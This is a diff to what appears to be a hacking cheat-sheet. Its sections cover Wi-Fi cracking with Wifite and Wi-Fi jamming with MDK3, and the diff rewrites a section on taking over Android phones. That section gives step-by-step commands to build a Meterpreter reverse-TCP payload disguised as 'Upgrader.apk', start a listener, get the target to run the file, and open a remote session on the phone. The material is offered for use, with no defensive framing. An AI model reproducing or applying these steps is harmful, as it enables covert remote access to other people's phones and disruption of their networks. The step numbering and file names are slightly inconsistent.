@@ -1,3 +1,11 @@
+# Wifi hacking with Wifite
+
+Step 1: wifite
+Step 2: Choose your target network.
+
+Wherein, a = authentication DoS mode.
+         e = To send to specified bssid.
+
 # Wifi jamming with MDK3.
 
 Step 1: airmon-ng start wlan0
@@ -10,10 +18,12 @@ Wherein, a = authentication DoS mode.
          
 # Hacking Android Phones
 
-Step 1: msfpayload android/meterpreter/reverse_tcp LHOST=192.168.1.19 R > /root/Upgrader.apk
-Step 2: Start metasploit by typing 'msfconsole'
-Step 3: use exploit/multi/handler
-Step 4: set payload android/meterpreter/reverse_tcp
-Step 5: set LHOST=192.168.1.19
-Step 6: Type "exploit" to start the listener.
-Step 7: Copy the Upgradder.apk file to phone and make the user run the file.
+Step 1: msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.19 LPORT=4444 R > Upgrader.apk
+Step 2: Transfer the Upgrader.apk file to target android phone.
+Step 3: Start metasploit by typing 'msfconsole'
+Step 4: use exploit/multi/handler
+Step 6: set lhost 192.168.1.19
+Step 7: set lport 4444
+Step 8: run
+Step 9: Run the installed Upgraded.apk file on target phone.
+Step 10: When meterpreter session is opened, run "sysinfo" to get target phone's system information.
